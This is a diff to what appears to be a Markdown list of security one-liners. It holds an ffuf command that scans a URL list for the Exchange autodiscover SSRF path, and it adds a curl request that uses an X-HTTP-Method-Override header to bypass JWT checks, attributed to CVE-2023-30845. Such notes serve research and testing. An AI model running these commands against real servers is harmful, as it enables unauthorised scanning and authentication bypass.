@@ -11,3 +11,11 @@
 <blockquote>
 <p dir="auto">ffuf -w "urllist.txt:URL" -u "https://URL/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL" -mr "IIS Web Core" -r
 </blockquote>
+## CVE-2023-30845 bypasses JWT checking by using the X-HTTP-Method-Override request header!
+<blockquote>
+<p dir="auto">curl --request POST \
+     --header "X-HTTP-Method-Override: PUT" \
+     --header "Content-Type: application/json" \
+     --data '{"username":"xyz"}' \
+     https://my-endpoint.com/api
+</blockquote>
